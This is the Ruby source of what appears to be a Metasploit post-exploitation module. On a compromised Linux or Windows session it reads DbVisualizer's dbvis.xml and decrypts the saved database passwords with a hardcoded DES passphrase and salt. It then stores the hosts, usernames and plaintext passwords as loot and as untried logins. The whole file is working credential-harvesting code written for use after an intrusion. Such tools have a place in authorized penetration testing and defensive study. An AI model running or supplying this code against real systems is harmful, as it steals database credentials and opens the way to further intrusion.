##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'
require 'digest/md5'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather DbVisualizer Connections Settings',
        'Description' => %q{
          DbVisualizer stores the user database configuration in dbvis.xml.
          This module retrieves the connections settings from this file and decrypts the encrypted passwords.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'David Bloom' ], # Twitter: @philophobia78
        'Platform' => %w[linux win],
        'SessionTypes' => [ 'meterpreter', 'shell'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_getenv
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('PASSPHRASE', [false, 'The hardcoded passphrase used for encryption']),
        OptInt.new('ITERATION_COUNT', [false, 'The iteration count used in key derivation', 10])
      ]
    )
  end

  def run
    oldversion = false

    case session.platform
    when 'linux'
      user = session.shell_command('whoami').chomp
      print_status("Current user is #{user}")
      if user =~ /root/
        user_base = '/root/'
      else
        user_base = "/home/#{user}/"
      end
      dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
    when 'windows'
      if session.type == 'meterpreter'
        user_profile = session.sys.config.getenv('USERPROFILE')
      else
        user_profile = cmd_exec('echo %USERPROFILE%').strip
      end
      dbvis_file = user_profile + '\\.dbvis\\config70\\dbvis.xml'
    end

    unless file?(dbvis_file)
      # File not found, we next try with the old config path
      print_status("File not found: #{dbvis_file}")
      print_status('This could be an older version of dbvis, trying old path')
      case session.platform
      when 'linux'
        dbvis_file = "#{user_base}.dbvis/config/dbvis.xml"
      when 'windows'
        dbvis_file = user_profile + '\\.dbvis\\config\\dbvis.xml'
      end
      unless file?(dbvis_file)
        print_error("File not found: #{dbvis_file}")
        return
      end
      oldversion = true
    end

    print_status("Reading: #{dbvis_file}")
    print_line
    raw_xml = ''
    begin
      raw_xml = read_file(dbvis_file)
    rescue EOFError
      # If there's nothing in the file, we hit EOFError
      print_error("Nothing read from file: #{dbvis_file}, file may be empty")
      return
    end

    if oldversion
      # Parse old config file
      db_table = parse_old_config_file(raw_xml)
    else
      # Parse new config file
      db_table = parse_new_config_file(raw_xml)
    end

    if db_table.rows.empty?
      print_status('No database settings found')
    else
      print_line
      print_line(db_table.to_s)
      print_good('Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun!')
      print_line
      # Store found databases in loot
      p = store_loot('dbvis.databases', 'text/csv', session, db_table.to_csv, 'dbvis_databases.txt', 'dbvis databases')
      print_good("Databases settings stored in: #{p}")
    end

    print_status("Downloading #{dbvis_file}")
    p = store_loot('dbvis.xml', 'text/xml', session, read_file(dbvis_file), dbvis_file.to_s, 'dbvis config')
    print_good "dbvis.xml saved to #{p}"
  end

  # New config file parse function
  def parse_new_config_file(raw_xml)
    db_table = Rex::Text::Table.new(
      'Header' => 'DbVisualizer Databases',
      'Indent' => 2,
      'Columns' =>
      [
        'Alias',
        'Type',
        'Server',
        'Port',
        'Database',
        'Namespace',
        'UserID',
        'Password'
      ]
    )

    dbs = []
    db = {}
    dbfound = false
    version_found = false

    # fetch config file
    raw_xml.each_line do |line|
      if version_found == false
        version_found = find_version(line)
      end

      if line =~ /<Database id=/
        dbfound = true
      elsif line =~ %r{</Database>}
        dbfound = false
        if db[:Database].nil?
          db[:Database] = ''
        end
        if db[:Namespace].nil?
          db[:Namespace] = ''
        end
        # save
        dbs << db if db[:Alias] && db[:Type] && db[:Server] && db[:Port]
        db = {}
      end

      next unless dbfound == true

      # get the alias
      if line =~ %r{<Alias>([\S+\s+]+)</Alias>}i
        db[:Alias] = ::Regexp.last_match(1)
      end

      # get the type
      if line =~ %r{<Type>([\S+\s+]+)</Type>}i
        db[:Type] = ::Regexp.last_match(1)
      end

      # get the user
      if line =~ %r{<Userid>([\S+\s+]+)</Userid>}i
        db[:UserID] = ::Regexp.last_match(1)
      end

      # get user password
      if line =~ %r{<Password>([\S+\s+]+)</Password>}i
        enc_password = ::Regexp.last_match(1)
        db[:Password] = decrypt_password(enc_password)
      end

      # get the server
      if line =~ %r{<UrlVariable UrlVariableName="Server">([\S+\s+]+)</UrlVariable>}i
        db[:Server] = ::Regexp.last_match(1)
      end

      # get the port
      if line =~ %r{<UrlVariable UrlVariableName="Port">([\S+\s+]+)</UrlVariable>}i
        db[:Port] = ::Regexp.last_match(1)
      end

      # get the database
      if line =~ %r{<UrlVariable UrlVariableName="Database">([\S+\s+]+)</UrlVariable>}i
        db[:Database] = ::Regexp.last_match(1)
      end

      # get the Namespace
      if line =~ %r{<UrlVariable UrlVariableName="Namespace">([\S+\s+]+)</UrlVariable>}i
        db[:Namespace] = ::Regexp.last_match(1)
      end
    end

    # Fill the tab and report eligible servers
    dbs.each do |database|
      if ::Rex::Socket.is_ipv4?(database[:Server].to_s)
        print_good("Reporting #{database[:Server]}")
        report_host(host: database[:Server])
      end

      db_table << [
        database[:Alias],
        database[:Type],
        database[:Server],
        database[:Port],
        database[:Database],
        database[:Namespace],
        database[:UserID],
        database[:Password]
      ]
      report_cred(
        ip: database[:Server],
        port: database[:Port].to_i,
        service_name: database[:Type],
        username: database[:UserID],
        password: database[:Password]
      )
    end

    return db_table
  end

  # New config file parse function
  def parse_old_config_file(raw_xml)
    db_table = Rex::Text::Table.new(
      'Header' => 'DbVisualizer Databases',
      'Indent' => 2,
      'Columns' =>
      [
        'Alias',
        'Type',
        'URL',
        'UserID',
        'Password'
      ]
    )

    dbs = []
    db = {}
    dbfound = false
    version_found = false

    # fetch config file
    raw_xml.each_line do |line|
      if version_found == false
        version_found = find_version(line)
      end

      if line =~ /<Database id=/
        dbfound = true
      elsif line =~ %r{</Database>}
        dbfound = false
        # save
        dbs << db if db[:Alias] && db[:Url]
        db = {}
      end

      next unless dbfound == true

      # get the alias
      if line =~ %r{<Alias>([\S+\s+]+)</Alias>}i
        db[:Alias] = ::Regexp.last_match(1)
      end

      # get the type
      if line =~ %r{<Type>([\S+\s+]+)</Type>}i
        db[:Type] = ::Regexp.last_match(1)
      end

      # get the user
      if line =~ %r{<Userid>([\S+\s+]+)</Userid>}i
        db[:UserID] = ::Regexp.last_match(1)
      end

      # get the user password
      if line =~ %r{<Password>([\S+\s+]+)</Password>}i
        enc_password = ::Regexp.last_match(1)
        db[:Password] = decrypt_password(enc_password)
      end

      # get the server URL
      if line =~ %r{<Url>(\S+)</Url>}i
        db[:URL] = ::Regexp.last_match(1)
      end
    end

    # Fill the tab
    dbs.each do |database|
      if (database[:URL] =~ %r{[\S+\s+]+/+([\S+\s+]+):[\S+]+}i)
        server = ::Regexp.last_match(1)
        if ::Rex::Socket.is_ipv4?(server)
          print_good("Reporting #{server}")
          report_host(host: server)
        end
      end
      db_table << [
        database[:Alias],
        database[:Type],
        database[:URL],
        database[:UserID],
        database[:Password]
      ]
      report_cred(
        ip: server,
        port: '',
        service_name: database[:Type],
        username: database[:UserID],
        password: database[:Password]
      )
    end

    return db_table
  end

  def find_version(tag)
    if tag =~ %r{<Version>([\S+\s+]+)</Version>}i
      print_good("DbVisualizer version: #{::Regexp.last_match(1)}")
      return true
    end

    false
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      post_reference_name: refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:username]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def decrypt_password(enc_password)
    enc_password = Rex::Text.decode_base64(enc_password)
    dk, iv = get_derived_key
    des = OpenSSL::Cipher.new('DES-CBC')
    des.decrypt
    des.key = dk
    des.iv = iv
    des.update(enc_password) + des.final
  end

  def get_derived_key
    key = passphrase + salt
    iteration_count.times do
      key = Digest::MD5.digest(key)
    end
    return key[0, 8], key[8, 8]
  end

  def salt
    [-114, 18, 57, -100, 7, 114, 111, 90].pack('C*')
  end

  def passphrase
    datastore['PASSPHRASE'] || 'qinda'
  end

  def iteration_count
    datastore['ITERATION_COUNT'] || 10
  end
end
